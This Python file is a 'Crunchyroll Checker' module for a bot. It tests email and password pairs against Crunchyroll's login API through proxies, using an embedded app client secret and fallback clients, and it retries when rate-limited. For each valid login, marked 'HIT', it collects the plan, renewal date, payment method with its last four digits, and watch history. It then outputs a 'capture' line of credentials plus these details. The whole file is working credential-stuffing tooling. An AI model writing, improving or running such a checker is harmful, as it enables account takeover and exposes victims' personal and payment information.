"""
Crunchyroll Checker — Full rebuild
Uses official beta API with proper auth, plan detection, profile info.
Mode 10 in the bot.
Fixed: was standalone script, now proper class. 
Added: profile locale, watch history count, family sub detection.
"""
import logging
import time
from typing import Dict, Optional, List
import requests

logger = logging.getLogger(__name__)

# Crunchyroll public Android app credentials
_CR_CLIENT_ID     = 'cr_android'
_CR_CLIENT_SECRET = 'p6LsptxEiDHTLLntM'
_CR_USER_AGENT    = 'Crunchyroll/3.46.2 Android/12 okhttp/4.12.0'

_AUTH_URL    = 'https://beta-api.crunchyroll.com/auth/v1/token'
_ACCOUNT_URL = 'https://beta-api.crunchyroll.com/accounts/v1/me'
_PROFILE_URL = 'https://beta-api.crunchyroll.com/accounts/v1/me/profile'
_SUBS_URL    = 'https://beta-api.crunchyroll.com/subs/v3/subscriptions/{account_id}/connected_payment_methods'
_BENEFIT_URL = 'https://beta-api.crunchyroll.com/subs/v1/subscriptions/{account_id}/benefits'
_HISTORY_URL = 'https://beta-api.crunchyroll.com/content/v2/{account_id}/watch-history?n=1'


class CrunchyrollChecker:
    def __init__(self, timeout: int = 20, proxy: str = None):
        self.timeout = timeout
        self.proxy   = proxy
        self.proxies = {'http': proxy, 'https': proxy} if proxy else None
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent':    _CR_USER_AGENT,
            'Content-Type':  'application/x-www-form-urlencoded',
            'Accept':        'application/json',
            'X-Datadog-Sampling-Priority': '0',
        })

    def _kw(self, extra: dict = None) -> dict:
        k = {'timeout': self.timeout}
        if self.proxies:
            k['proxies'] = self.proxies
        if extra:
            k.update(extra)
        return k

    def _login(self, email: str, password: str) -> Optional[Dict]:
        """Authenticate. Returns token dict or None."""
        # Try primary client first, then fallback
        for client_id, client_secret in [
            (_CR_CLIENT_ID, _CR_CLIENT_SECRET),
            ('cr_mac_app', 'notasecret'),
            ('noaihdeaf_noeaojdnajskfjasdf_client_id', ''),
        ]:
            try:
                r = self.session.post(
                    _AUTH_URL,
                    data={
                        'username':   email,
                        'password':   password,
                        'grant_type': 'password',
                        'scope':      'offline_access',
                    },
                    auth=(client_id, client_secret),
                    **self._kw()
                )
                if r.status_code == 200:
                    return r.json()
                if r.status_code == 401:
                    return None   # wrong credentials
                if r.status_code == 400:
                    data = r.json()
                    if 'invalid_grant' in str(data):
                        return None
                if r.status_code == 429:
                    time.sleep(2)
                    continue
            except Exception as exc:
                logger.debug(f"CR login error: {exc}")
                continue
        return None

    def _get_account(self, token: str) -> Optional[Dict]:
        try:
            r = self.session.get(
                _ACCOUNT_URL,
                headers={'Authorization': f'Bearer {token}'},
                **self._kw()
            )
            if r.status_code == 200:
                return r.json()
        except Exception as exc:
            logger.debug(f"CR account error: {exc}")
        return None

    def _get_profile(self, token: str) -> Optional[Dict]:
        try:
            r = self.session.get(
                _PROFILE_URL,
                headers={'Authorization': f'Bearer {token}'},
                **self._kw()
            )
            if r.status_code == 200:
                return r.json()
        except Exception:
            pass
        return None

    def _get_subscription(self, token: str, account_id: str) -> Optional[Dict]:
        try:
            r = self.session.get(
                _SUBS_URL.format(account_id=account_id),
                headers={'Authorization': f'Bearer {token}'},
                **self._kw()
            )
            if r.status_code == 200:
                return r.json()
        except Exception:
            pass
        return None

    def _get_benefits(self, token: str, account_id: str) -> Optional[Dict]:
        try:
            r = self.session.get(
                _BENEFIT_URL.format(account_id=account_id),
                headers={'Authorization': f'Bearer {token}'},
                **self._kw()
            )
            if r.status_code == 200:
                return r.json()
        except Exception:
            pass
        return None

    def _get_watch_history_count(self, token: str, account_id: str) -> int:
        try:
            r = self.session.get(
                _HISTORY_URL.format(account_id=account_id),
                headers={'Authorization': f'Bearer {token}'},
                **self._kw()
            )
            if r.status_code == 200:
                return r.json().get('total', 0)
        except Exception:
            pass
        return 0

    def check_full(self, email: str, password: str) -> Dict:
        result = {
            'email': email, 'password': password,
            'status': 'BAD',
            'has_crunchyroll':  False,
            'account_id':       None,
            'username':         None,
            'display_name':     None,
            'email_verified':   False,
            'created':          None,
            'locale':           None,
            'maturity_rating':  None,
            'is_premium':       False,
            'plan_name':        None,
            'next_renewal':     None,
            'trial':            False,
            'family_mode':      False,
            'payment_method':   None,
            'watch_history_count': 0,
        }

        token_data = self._login(email, password)
        if not token_data:
            return result

        token = token_data.get('access_token')
        if not token:
            return result

        result['status']          = 'HIT'
        result['has_crunchyroll'] = True

        # Account info
        account = self._get_account(token)
        if account:
            result['account_id']    = account.get('account_id')
            result['username']      = account.get('username')
            result['email_verified']= account.get('email_verified', False)
            result['created']       = (account.get('created', '') or '')[:10]

        # Profile info
        profile = self._get_profile(token)
        if profile:
            result['display_name']   = profile.get('preferred_communication_language')
            result['locale']         = profile.get('preferred_content_audio_language')
            result['maturity_rating']= profile.get('maturity_rating')

        # Subscription + benefits
        if result['account_id']:
            subs = self._get_subscription(token, result['account_id'])
            if subs:
                items = subs.get('items', [])
                for item in items:
                    plan = item.get('subscription_plan', {}) or {}
                    if plan:
                        result['is_premium']  = True
                        result['plan_name']   = (
                            plan.get('product_display_name') or
                            plan.get('id', 'Premium')
                        )
                        result['next_renewal']= (item.get('next_renewal_date', '') or '')[:10]
                        result['trial']       = item.get('trial', False)
                        # Payment method
                        pm = item.get('payment_method', {})
                        if pm:
                            pm_type = pm.get('type', '')
                            pm_last = pm.get('last_four', '')
                            result['payment_method'] = f"{pm_type} ***{pm_last}" if pm_last else pm_type
                        break

            # Benefits — check for Mega Fan / Ultimate Fan
            benefits = self._get_benefits(token, result['account_id'])
            if benefits:
                for b in benefits.get('items', []):
                    if 'family' in str(b).lower():
                        result['family_mode'] = True
                    if 'mega' in str(b).lower() or 'ultimate' in str(b).lower():
                        result['plan_name'] = 'Mega Fan' if 'mega' in str(b).lower() else 'Ultimate Fan'

            # Watch history
            result['watch_history_count'] = self._get_watch_history_count(token, result['account_id'])

        return result

    def format_capture(self, r: Dict) -> str:
        parts = [f"{r['email']}:{r.get('password','?')}"]
        if r.get('username'):       parts.append(f"User:{r['username']}")
        if r.get('is_premium'):     parts.append(f"Plan:{r.get('plan_name','Premium')}")
        else:                       parts.append('Free')
        if r.get('next_renewal'):   parts.append(f"Renews:{r['next_renewal']}")
        if r.get('trial'):          parts.append('Trial')
        if r.get('family_mode'):    parts.append('FamilyMode')
        if r.get('payment_method'): parts.append(f"Pay:{r['payment_method']}")
        if r.get('watch_history_count'): parts.append(f"Watched:{r['watch_history_count']}")
        if r.get('locale'):         parts.append(f"Lang:{r['locale']}")
        return ' | '.join(parts)
